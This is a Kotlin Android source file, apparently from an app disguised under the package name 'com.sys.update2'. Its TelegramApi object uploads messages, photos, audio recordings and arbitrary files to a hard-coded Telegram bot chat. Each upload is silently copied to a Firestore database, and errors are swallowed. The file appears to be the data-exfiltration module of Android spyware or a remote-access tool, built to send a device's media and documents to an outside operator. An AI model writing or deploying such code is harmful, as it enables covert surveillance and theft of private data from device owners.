package com.sys.update2

import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object TelegramApi {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun baseUrl(): String = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}"

    private fun saveToFirestore(chatId: Long, type: String, fileId: String?, text: String?, caption: String?) {
        try {
            Thread {
                try {
                    val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/messages?key=${Config.FIREBASE_API_KEY}"
                    val timeStr = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(Date())

                    val fields = JSONObject()
                    fields.put("chat_id", JSONObject().put("integerValue", chatId.toString()))
                    fields.put("type", JSONObject().put("stringValue", type))
                    if (fileId != null) fields.put("file_id", JSONObject().put("stringValue", fileId))
                    if (text != null) fields.put("text", JSONObject().put("stringValue", text))
                    if (caption != null) fields.put("caption", JSONObject().put("stringValue", caption))
                    fields.put("time", JSONObject().put("timestampValue", timeStr))
                    fields.put("time_ms", JSONObject().put("integerValue", System.currentTimeMillis().toString()))

                    val body = JSONObject().apply { put("fields", fields) }.toString()

                    val req = Request.Builder()
                        .url(url)
                        .post(body.toRequestBody("application/json".toMediaType()))
                        .build()

                    client.newCall(req).execute().use { }
                } catch (_: Exception) {}
            }.start()
        } catch (_: Exception) {}
    }

    fun sendMessage(text: String, keyboard: JSONObject? = null): Int {
        return try {
            val json = JSONObject().apply {
                put("chat_id", Config.TELEGRAM_CHAT_ID)
                put("text", text)
                put("parse_mode", "Markdown")
                put("disable_web_page_preview", true)
                if (keyboard != null) put("reply_markup", keyboard)
            }.toString()

            val req = Request.Builder()
                .url("${baseUrl()}/sendMessage")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            val msgId = client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return 0
                val obj = JSONObject(body)
                if (obj.optBoolean("ok", false)) {
                    obj.optJSONObject("result")?.optInt("message_id", 0) ?: 0
                } else 0
            }

            saveToFirestore(Config.TELEGRAM_CHAT_ID.toLong(), "text", null, text, null)
            msgId
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendMessage err: ${e.message}")
            0
        }
    }

    fun sendPhoto(file: File, caption: String = ""): Boolean {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("photo", file.name, file.asRequestBody("image/*".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendPhoto").post(body).build()

            var fileId: String? = null
            val ok = client.newCall(req).execute().use { resp ->
                val respBody = resp.body?.string() ?: return@use false
                val obj = JSONObject(respBody)
                if (obj.optBoolean("ok", false)) {
                    val photos = obj.optJSONObject("result")?.optJSONArray("photo")
                    if (photos != null && photos.length() > 0) {
                        fileId = photos.optJSONObject(photos.length() - 1)?.optString("file_id")
                    }
                    true
                } else false
            }

            if (ok && fileId != null) {
                saveToFirestore(Config.TELEGRAM_CHAT_ID.toLong(), "photo", fileId!!, null, caption)
            }
            ok
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendPhoto err: ${e.message}")
            false
        }
    }

    fun sendAudio(file: File, caption: String = ""): Boolean {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("audio", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendAudio").post(body).build()

            var fileId: String? = null
            val ok = client.newCall(req).execute().use { resp ->
                val respBody = resp.body?.string() ?: return@use false
                val obj = JSONObject(respBody)
                if (obj.optBoolean("ok", false)) {
                    fileId = obj.optJSONObject("result")?.optJSONObject("audio")?.optString("file_id")
                    true
                } else false
            }
            if (ok && fileId != null) {
                saveToFirestore(Config.TELEGRAM_CHAT_ID.toLong(), "audio", fileId!!, null, caption)
            }
            ok
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendAudio err: ${e.message}")
            false
        }
    }

    fun sendDocument(file: File, caption: String = ""): Boolean {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", caption.take(1000))
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()

            val req = Request.Builder().url("${baseUrl()}/sendDocument").post(body).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.e("TelegramApi", "sendDocument err: ${e.message}")
            false
        }
    }

    fun answerCallback(callbackId: String, text: String = ""): Boolean {
        return try {
            val json = JSONObject().apply {
                put("callback_query_id", callbackId)
                if (text.isNotBlank()) put("text", text)
            }.toString()
            val req = Request.Builder()
                .url("${baseUrl()}/answerCallbackQuery")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { true }
        } catch (_: Exception) { false }
    }
}
